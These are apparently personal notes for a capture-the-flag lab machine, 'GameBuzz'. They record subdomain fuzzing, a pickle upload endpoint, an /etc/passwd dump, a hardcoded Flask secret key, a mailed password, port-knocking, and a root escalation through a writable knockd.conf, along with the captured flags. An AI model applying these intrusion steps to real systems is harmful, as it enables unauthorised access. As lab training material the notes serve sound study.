# GameBuzz 

> VOiD | Friday 11 February 2022 06:54:37 AM UTC

My IP : 10.8.253.221
Target IP : 


## PORT 80 [http]
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u "http://incognito.com/" -H "Host: FUZZ.incognito.com" -v  | tee wfuzz.log

we found dev


also 
POST /fetch HTTP/1.1
takes data object with .pkl extention which is pickle objects


dev.incognito.com

User-Agent: *
Disallow: /secret


/secret/upload
```

## USER [www-data]
```bash
/etc/passwd
root:x:0:0:root:/root:/bin/bash
dev1:x:1001:1001::/home/dev1:/bin/bash
dev2:x:1000:1000:cirius:/home/dev2:/bin/bash



```
```py
www-data@incognito:/var/www/incognito.com$ cat incognito.wsgi 

#!/usr/bin/python3
import sys
import logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/incognito.com/incognito/")

from incognito import app as application
application.secret_key = 'KeepITSecret'

```
```bash
www-data@incognito:/home/dev2$ cat user.txt 
d14def35ed0bd914c1c5881fa0fa8090
su dev2
```

## USER [dev2]
```bash
dev2@incognito:/var/mail$ cat dev1 
Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
Knock yourself in!


dev2@incognito:/var/mail$ cat /etc/knockd.conf 
[options]
	logfile = /var/log/knockd.log

[openSSH]
	sequence    = 5020,6120,7340
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9000,8000,7000
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
	tcpflags    = syn

knock incognito.com 5020:tcp 6120:tcp 7340:tcp
```

## USER [dev1]
```bash
User dev1 may run the following commands on incognito:
    (root) /etc/init.d/knockd


dev1@incognito:~$ ls -la /etc/knockd.conf
-rw-rw-r--+ 1 root root 342 Feb 11 08:37 /etc/knockd.conf

sudo /etc/init.d/knockd restart

root@incognito:/root# cat root.txt
cat root.txt
9dcb607e31348671de36b9eb7446cb59

```